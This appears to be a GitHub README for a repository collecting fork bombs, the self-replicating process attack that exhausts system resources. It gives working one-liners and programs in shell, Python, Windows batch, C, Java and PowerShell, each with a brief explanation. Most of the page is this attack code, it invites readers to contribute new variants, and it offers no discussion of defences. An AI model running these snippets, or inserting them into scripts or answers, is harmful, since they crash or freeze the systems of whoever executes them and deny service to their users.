# Fork Bombs Collection

A repository to list and explain various fork bomb commands across different programming languages.

## What is a Fork Bomb?

A fork bomb is a denial-of-service attack that exploits the `fork` system call to create a large number of processes, consuming system resources and potentially causing the system to crash or become unresponsive. Fork bombs are recursive processes that call themselves repeatedly, leading to an exponential growth in the number of processes.

## List of Fork Bombs

### Shell Fork Bomb

The classic shell fork bomb, often attributed to Jaromil, is a 13-character command that can bring a system to its knees within seconds:

```shell
:(){ :|:& };:
```


This command defines a function`:`that calls itself twice in the background,leading to a rapid increase in the number of processes.The function is then called,initiating the fork bomb.


### Python Fork Bomb

A simple Python fork bomb can be written using the`os.fork()`method:


```python
import os
while True:
    os.fork()
```


This script continuously forks new processes,eventually exhausting system resources.


### Batch File Fork Bomb

A basic fork bomb in a Windows batch file can be implemented as follows:


```batch
@echo off
:start
start %0
goto start
```


This script starts a new instance of itself in an infinite loop,leading to a rapid increase in the number of processes.


### C Fork Bomb

A simple C fork bomb can be written using the`fork()`system call:


```c
#include <unistd.h>
int main() {
    while (1) {
        fork();
    }
}
```


This program continuously forks new processes,eventually exhausting system resources.


### Java Fork Bomb

A Java fork bomb can be implemented using the`Runtime.exec()`method:


```java
public class ForkBomb {
    public static void main(String[] args) {
        while (true) {
            Runtime.getRuntime().exec(new String[]{"java", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
        }
    }
}
```


This program continuously starts new instances of itself,leading to a rapid increase in the number of processes.


### PowerShell Fork Bomb

A PowerShell fork bomb can be implemented as follows:


```powershell
while ($true) {
    Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"
    Invoke-Expression -Command 'while ($true) { Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:" }'
}
```


This script starts new instances of PowerShell in an infinite loop,leading to a rapid increase in the number of processes.

```powershell
foreach ($i in 0..1) {
    Start-Process -FilePath powershell -ArgumentList '-File', $MyInvocation.MyCommand.Path 
}
```

Each instance of the script starts two new PowerShell processes that run the same script, and each of those starts two more, and so on.


## Latest Updates

As of the latest updates,there have been several discussions and implementations of fork bombs in various languages.Some of the recent repositories include:


• A collection of fork bombs in different languages,updated on January 4,2024.

• A simple fork bomb with explanations and mitigation techniques,updated on February 16,2024.


## Contributing

Contributions are welcome!If you have a new fork bomb or an interesting variation,please feel free to open a pull request.Here are the steps to contribute:


• Fork this repository.

• Create a new branch:`git checkout -b feature-branch`.

• Commit your changes:`git commit -m "Add new fork bomb"`.

• Push to your branch:`git push origin feature-branch`.

• Open a pull request.


License

This project is licensed under the MIT License-see the [LICENSE](https://github.com/mowhn/ForkBombHub/blob/main/LICENSE) file for details.


---
